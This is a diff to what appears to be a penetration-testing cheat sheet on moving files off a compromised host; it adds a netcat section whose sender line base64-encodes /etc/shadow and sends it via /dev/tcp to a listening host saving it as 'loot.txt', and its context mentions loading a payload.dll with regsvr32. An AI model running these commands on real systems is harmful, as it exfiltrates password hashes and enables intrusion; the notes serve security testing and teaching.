@@ -58,7 +58,19 @@ regsvr32 /s /u C:\temp\payload.dll
 
 \(_Source:_ [_http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html_](http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html) __\)
 
-### Base64 \(Copy/Paste\)
+### Base64
+
+#### Using netcat
+
+```bash
+# receiving host
+nc -lp 4443 | base64 -d > loot.txt
+
+# sender host
+base64 /etc/shadow > /dev/tcp/10.10.10.123/4443
+```
+
+#### Copy and Paste
 
 ```bash
 ## encode from file with:
